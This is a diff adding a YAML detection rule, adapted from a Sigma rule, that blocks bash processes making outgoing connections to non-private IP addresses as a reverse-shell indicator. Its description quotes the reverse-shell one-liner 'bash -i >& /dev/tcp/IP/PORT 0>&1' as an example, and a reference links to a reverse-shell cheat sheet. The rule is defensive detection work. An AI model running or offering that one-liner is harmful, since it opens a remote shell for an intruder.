@@ -1,0 +1,34 @@
+# Inspired by SigmaHQ rule: https://github.com/SigmaHQ/sigma/blob/master/rules/linux/network_connection/net_connection_lnx_back_connect_shell_dev.yml
+
+title: Linux Reverse Shell Indicator
+id: 202
+status: test
+description: "Detects bash connecting to a remote IP address, commonly seen in reverse shell attacks like bash -i >& /dev/tcp/IP/PORT 0>&1"
+references:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/d9921e370b7c668ee8cc42d09b1932c1b98fa9dc/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+author: Florian Roth (Nextron Systems)
+date: 2021-10-16
+modified: 2022-12-25
+tags:
+    - attack.execution
+    - attack.t1059.004
+logsource:
+    product: linux
+    category: network_connection
+action: "BLOCK_KILL_PROCESS"
+events:
+    - NETWORK
+detection:
+    selection:
+        process.file.path|endswith: "/bin/bash"
+        network.direction: "OUTGOING"
+    filter_local:
+        network.destination_ip|cidr:
+            - "127.0.0.0/8"
+            - "10.0.0.0/8"
+            - "172.16.0.0/12"
+            - "192.168.0.0/16"
+    condition: selection and not filter_local
+falsepositives:
+    - Legitimate bash scripts making outbound connections
+level: critical
